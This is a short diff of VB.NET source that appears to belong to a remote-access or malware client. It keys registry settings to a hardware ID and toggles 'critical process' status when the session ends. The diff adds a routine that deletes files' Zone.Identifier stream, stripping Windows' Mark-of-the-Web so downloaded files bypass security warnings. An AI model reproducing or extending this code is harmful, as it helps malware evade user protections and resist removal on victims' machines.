@@ -21,7 +21,7 @@
             Try
                 Return Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & C_ID.HWID).GetValue(n, "")
             Catch ex As Exception
-                Return ""
+                Return Nothing
             End Try
         End Function
 
@@ -50,9 +50,9 @@
 
         Sub Handler_SessionEnding(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
             If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
-                C_CriticalProcesses.CriticalProcesses_Disable()
+                C_CriticalProcess.CriticalProcesses_Disable()
             ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
-                C_CriticalProcesses.CriticalProcesses_Disable()
+                C_CriticalProcess.CriticalProcesses_Disable()
             End If
         End Sub
 
@@ -83,6 +83,14 @@
                 Return array
             End If
         End Function
+
+        <Runtime.InteropServices.DllImport("kernel32.dll", CharSet:=Runtime.InteropServices.CharSet.Auto, BestFitMapping:=False, ThrowOnUnmappableChar:=True, SetLastError:=True)>
+        Function DeleteFile(<Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.LPTStr)> ByVal filepath As String
+            ) As <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> Boolean
+        End Function
+        Sub DeleteZoneIdentifier(ByVal filePath As String)
+            Try : DeleteFile(filePath + ":Zone.Identifier") : Catch : End Try
+        End Sub
 
     End Module
 End Namespace
